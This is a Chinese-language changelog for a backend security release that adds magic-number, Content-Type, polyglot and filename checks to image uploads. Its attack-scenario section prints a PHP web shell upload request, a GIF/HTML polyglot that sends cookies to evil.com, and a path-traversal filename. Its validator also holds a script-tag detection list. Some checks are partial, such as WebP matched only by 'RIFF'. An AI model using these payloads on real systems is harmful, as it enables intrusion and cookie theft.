# FanCommunity 后端 v1.0.26 更新日志

## 版本信息
- **版本号**: v1.0.26
- **更新日期**: 2026-05-13
- **更新类型**: 安全修复

## 更新概述
本次更新修复了 **图片上传安全校验缺失** 问题。新增文件魔数（Magic Number）校验、Content-Type 一致性校验、文件内容安全检查和文件名安全过滤，防止攻击者上传伪装成图片的恶意文件。

---

## 安全漏洞说明

### 漏洞详情
- **漏洞类型**: 文件上传漏洞 / 任意文件上传
- **风险等级**: 🟠 中危
- **CVE 参考**: 类似 OWASP A03:2021 - Injection

### 原有问题
```python
# 旧代码：仅校验 Content-Type
if file.content_type not in settings.ALLOWED_IMAGE_TYPES:
    raise HTTPException(...)

content = file.file.read()
# 直接保存，无任何内容校验
```

**风险分析**:
1. **Content-Type 可伪造**: 攻击者可将恶意文件 Content-Type 设为 `image/jpeg` 绕过检查
2. **无文件头校验**: 不检查文件实际内容，无法识别伪装文件
3. **文件名未过滤**: 可能包含路径遍历字符（`../`）或特殊字符
4. **Polyglot 攻击**: 攻击者可创建同时是图片和脚本的文件

---

## 详细修改内容

### 1. 新增图片安全校验模块 (`app/utils/image_validator.py`)

#### 1.1 文件魔数（Magic Number）校验

```python
# 图片文件魔数定义
IMAGE_MAGIC_NUMBERS = {
    b'\xff\xd8\xff': ('image/jpeg', '.jpg'),        # JPEG
    b'\x89PNG\r\n\x1a\n': ('image/png', '.png'),     # PNG
    b'GIF87a': ('image/gif', '.gif'),                # GIF87a
    b'GIF89a': ('image/gif', '.gif'),                # GIF89a
    b'RIFF': ('image/webp', '.webp'),                # WebP
}

def validate_magic_number(content: bytes) -> Tuple[str, str]:
    """通过文件头字节判断文件真实类型"""
    for magic_bytes, (mime_type, extension) in IMAGE_MAGIC_NUMBERS.items():
        if content[:len(magic_bytes)] == magic_bytes:
            return mime_type, extension
    raise ValueError("无法识别的文件类型")
```

**防护效果**: 即使攻击者将 Content-Type 设为 `image/jpeg`，如果文件实际内容不是 JPEG 格式，校验将失败。

#### 1.2 Content-Type 一致性校验

```python
def validate_content_type_consistency(content_type: str, actual_mime: str):
    """校验客户端声明的 Content-Type 与文件实际类型是否一致"""
    if content_type.lower() != actual_mime.lower():
        raise ValueError(
            f"Content-Type 与文件实际类型不匹配："
            f"声明为 {content_type}，实际为 {actual_mime}"
        )
```

#### 1.3 文件内容安全检查（Polyglot 攻击防护）

```python
def validate_image_content(content: bytes):
    """
    检查文件是否包含嵌入的恶意脚本标签
    防止 polyglot 攻击（同时是图片和 HTML/PHP 的文件）
    """
    suspicious_patterns = [
        b'<script',    # JavaScript
        b'<?php',      # PHP
        b'<%',         # ASP
        b'<!DOCTYPE',  # HTML
    ]
    # 在文件头和尾部检查
    for check_content in [content[:1024], content[-1024:]]:
        for pattern in suspicious_patterns:
            if pattern.lower() in check_content.lower():
                raise ValueError("检测到可疑的脚本标签")
```

#### 1.4 文件名安全过滤

```python
UNSAFE_FILENAME_CHARS = {'/', '\\', '..', '\0', '<', '>', '|', '*', '?', '"', "'"}

def sanitize_filename(filename: str) -> str:
    """
    安全过滤文件名：
    - 移除路径遍历字符（..、/、\）
    - 移除特殊字符
    - 限制长度
    """
    filename = os.path.basename(filename)  # 去除路径
    safe_name = ''.join(c for c in filename if c not in UNSAFE_FILENAME_CHARS)
    return safe_name
```

#### 1.5 完整校验流程

```python
def full_image_validation(content, content_type, original_filename):
    """完整的图片安全校验流程"""
    # 1. 文件大小检查
    # 2. 文件魔数校验（确定真实文件类型）
    # 3. Content-Type 一致性校验
    # 4. 文件内容安全检查
    # 5. 文件名安全过滤
    # 6. 扩展名与实际类型一致性
    return safe_filename, detected_mime
```

### 2. 重构图片上传函数 (`app/routers/post_router.py`)

```python
def _save_image_file(file: UploadFile) -> tuple[str, int]:
    """
    安全校验流程：
    1. 读取文件内容
    2. 文件大小校验
    3. 文件魔数校验 — 防止伪装成图片的恶意文件
    4. Content-Type 一致性校验
    5. 文件内容安全检查 — 防止 polyglot 攻击
    6. 文件名安全过滤 — 防止路径遍历
    7. 生成安全的唯一文件名
    """
    content = file.file.read()
    
    # 安全校验
    try:
        safe_filename, detected_mime = full_image_validation(
            content=content,
            content_type=file.content_type,
            original_filename=file.filename,
        )
    except ValueError as e:
        logger.warning(f"图片安全校验失败: {e}")
        raise HTTPException(status_code=400, detail=f"图片安全校验失败: {str(e)}")
    
    # 使用检测到的真实扩展名（而非客户端声明的）
    ext = get_extension_from_mime(detected_mime)
    unique_name = f"{uuid.uuid4().hex}{ext}"
    ...
```

---

## 安全校验流程

```
┌─────────────────────────────────────────────────────────────┐
│                   客户端上传图片                            │
│            Content-Type: image/jpeg                        │
│            Filename: ../../evil.php.jpg                     │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  ① 文件大小校验                                            │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 0 bytes → 拒绝                                       │   │
│  │ > 5MB → 拒绝                                        │   │
│  │ 正常 → 继续                                         │   │
│  └─────────────────────────────────────────────────────┘   │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  ② 文件魔数校验（Magic Number）                            │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 读取文件头字节 → 匹配已知图片格式                      │   │
│  │ FF D8 FF → JPEG ✓                                    │   │
│  │ 89 50 4E 47 → PNG ✓                                  │   │
│  │ GIF89a → GIF ✓                                      │   │
│  │ RIFF...WEBP → WebP ✓                                 │   │
│  │ 不匹配 → 拒绝 ❌                                     │   │
│  └─────────────────────────────────────────────────────┘   │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  ③ Content-Type 一致性校验                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 声明: image/jpeg                                     │   │
│  │ 实际: image/png                                      │   │
│  │ 不匹配 → 拒绝 ❌（可能伪造 Content-Type）              │   │
│  └─────────────────────────────────────────────────────┘   │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  ④ 文件内容安全检查（Polyglot 防护）                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 检查文件头/尾是否包含:                                │   │
│  │ <script, <?php, <%, <!DOCTYPE                       │   │
│  │ 发现 → 拒绝 ❌（可能是 polyglot 恶意文件）             │   │
│  └─────────────────────────────────────────────────────┘   │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  ⑤ 文件名安全过滤                                          │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 原始: ../../evil.php.jpg                              │   │
│  │ 过滤: evil.php.jpg                                    │   │
│  │ 扩展名替换: evil.php.jpg → evil.php.jpg → .jpg       │   │
│  │ 最终: a1b2c3d4e5f6.jpg（UUID + 安全扩展名）            │   │
│  └─────────────────────────────────────────────────────┘   │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  ✅ 保存文件                                                │
└─────────────────────────────────────────────────────────────┘
```

---

## 攻击场景分析

### 场景 1：伪造 Content-Type

**攻击方式**: 将 PHP 木马的 Content-Type 设为 `image/jpeg`

```
POST /v1/posts/1/images
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="files"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

**防御效果**: ✅ 文件魔数校验失败，`<?php` 不匹配任何图片格式，请求被拒绝。

### 场景 2：Polyglot 文件

**攻击方式**: 创建同时是 GIF 和 HTML 的文件

```
GIF89a
<html><body><script>document.location='http://evil.com?c='+document.cookie</script></body></html>
```

**防御效果**: ✅ 文件内容安全检查检测到 `<script` 标签，请求被拒绝。

### 场景 3：路径遍历

**攻击方式**: 文件名包含路径遍历字符

```
Filename: ../../uploads/shell.php
```

**防御效果**: ✅ `sanitize_filename()` 移除 `../`，且扩展名被替换为检测到的真实类型。

---

## 错误响应示例

### 文件类型不匹配

```json
{
  "detail": "图片安全校验失败: Content-Type 与文件实际类型不匹配：声明为 image/jpeg，实际为 image/png"
}
```

### 检测到可疑内容

```json
{
  "detail": "图片安全校验失败: 检测到可疑内容：文件中包含不安全的脚本标签。该文件可能不是合法的图片文件。"
}
```

### 无法识别的文件类型

```json
{
  "detail": "图片安全校验失败: 无法识别的文件类型，文件头不匹配任何已知图片格式。文件头（十六进制）: 3c3f706870"
}
```

---

## 文件变更清单

| 文件路径 | 变更类型 | 说明 |
|----------|----------|------|
| `app/utils/image_validator.py` | 新增 | 图片安全校验工具模块 |
| `app/routers/post_router.py` | 修改 | 重构 `_save_image_file()` 集成安全校验 |
| `app/main.py` | 修改 | 版本号更新为 1.0.26 |

---

## 后续安全建议

1. **病毒扫描**: 集成 ClamAV 对上传文件进行病毒扫描
2. **图片重编码**: 使用 Pillow 对图片进行重新编码，彻底清除嵌入的恶意内容
3. **存储隔离**: 上传文件存储在非 Web 可访问的目录，通过专门的接口提供访问
4. **CDN 集成**: 使用 OSS/S3 + CDN 替代本地存储，减少服务器直接暴露风险

---

**版本**: v1.0.26  
**更新者**: Code Assistant  
**更新时间**: 2026-05-13
